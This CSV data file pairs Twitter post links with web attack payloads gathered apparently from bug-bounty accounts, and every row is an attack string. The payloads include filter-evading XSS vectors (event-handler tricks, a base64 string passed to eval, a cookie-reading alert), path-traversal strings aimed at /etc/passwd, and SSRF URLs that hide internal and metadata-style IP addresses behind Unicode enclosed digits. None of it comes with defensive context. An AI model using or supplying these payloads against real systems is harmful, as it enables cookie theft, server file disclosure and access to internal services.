source_link,payload
https://twitter.com/startupmonit0r/status/1318031720336232455,javascript:%ef%bb%bfalert(XSS)
https://twitter.com/hunter0x7/status/1316360918029262854,%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F
https://twitter.com/hunter0x7/status/1316360918029262854,%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd
https://twitter.com/hunter0x7/status/1316360918029262854,../../etc/passwd
https://twitter.com/hunter0x7/status/1316360918029262854,"<svG/x="">""/oNloaD=confirm()//"
https://twitter.com/hunter0x7/status/1316086759197900801,http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
https://twitter.com/hunter0x7/status/1316086759197900801,http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
https://twitter.com/hunter0x7/status/1316086759197900801,http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
https://twitter.com/hunter0x7/status/1316086759197900801,http://②⑧⑤②⓪③⑨①⑥⑥:80/
https://twitter.com/hunter0x7/status/1316086759197900801,http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
https://twitter.com/hunter0x7/status/1316086759197900801,http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥
https://twitter.com/bugbountynights/status/1313736316933361666,alert?.(document?.cookie)
https://twitter.com/XssPayloads/status/1313343975181504512,<x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave;1&DiacriticalGrave;>Tocuch me!
https://twitter.com/Bc10ver,"<input accesskey=X onclick=""self['wind'+'ow']['one'+'rror']=alert;throw 1337;"">"
https://twitter.com/Bc10ver/status/1311076328578469889,<lol/onauxclick=[0].some(alert)>rightclickhere
https://twitter.com/ShawarkOFFICIAL/status/1310885148381057026,"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss"
